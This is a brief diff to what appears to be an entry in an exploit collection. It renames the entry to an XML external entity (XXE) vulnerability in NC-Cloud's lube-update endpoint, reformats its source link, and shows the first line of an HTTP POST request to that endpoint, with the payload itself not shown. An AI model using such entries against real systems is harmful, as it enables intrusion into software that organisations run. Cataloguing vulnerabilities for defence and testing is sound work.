@@ -1,5 +1,5 @@
-# NC-Cloud_INtbOBAWebService_xxe
-from : https://bbs.zkaq.cn/t/31529.html
+# NC-Cloud_lube-update_xxe
+from : [https://bbs.zkaq.cn/t/31529.html](https://bbs.zkaq.cn/t/31529.html)
 2024.3.8 @2
 ```
 POST /hrss/dorado/lube.update.d?__rpc=true&__rpcAgent=true HTTP/1.1
